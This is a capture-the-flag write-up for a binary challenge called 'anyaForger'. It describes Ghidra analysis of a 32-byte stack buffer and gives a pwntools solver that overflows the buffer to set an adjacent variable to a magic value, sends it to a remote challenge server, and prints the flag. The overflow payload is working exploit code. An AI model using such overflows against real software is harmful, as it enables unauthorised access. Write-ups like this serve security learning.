# anyaForger

> Let's see if you can get the flag.

Download the attachment [here](file/beef)

## How to Solve

First we use `Ghidra` to do static analysis, and look the main function


[Image extracted text: [Image not found]]


The main function is called `vuln` function, then we see code inside


[Image extracted text: [Image not found]]


At variable `local_30` is have 32 byte size so we need to filled them and make sure the variable `local_10` is equal to `-0x21524111`

Which is will called the `anyaForger` function and flag inside it


[Image extracted text: [Image not found]]


This the solver I use

```
from pwn import *

exe = './beef'
host, port = '139.144.184.150', 31337
elf = context.binary = ELF(exe, checksec=True)
rop = ROP(exe)
context.log_level = 'info'

# io = process(exe)
io = remote(host, port)

offset = b'A'*32

payload = flat([
    offset,
    -0x21524111
])

io.sendline(payload)
io.interactive()
```


[Image extracted text: [Image not found]]


And we got flag

```
BDSEC{artificial_intelligence_guides_us_to_a_better_future}
```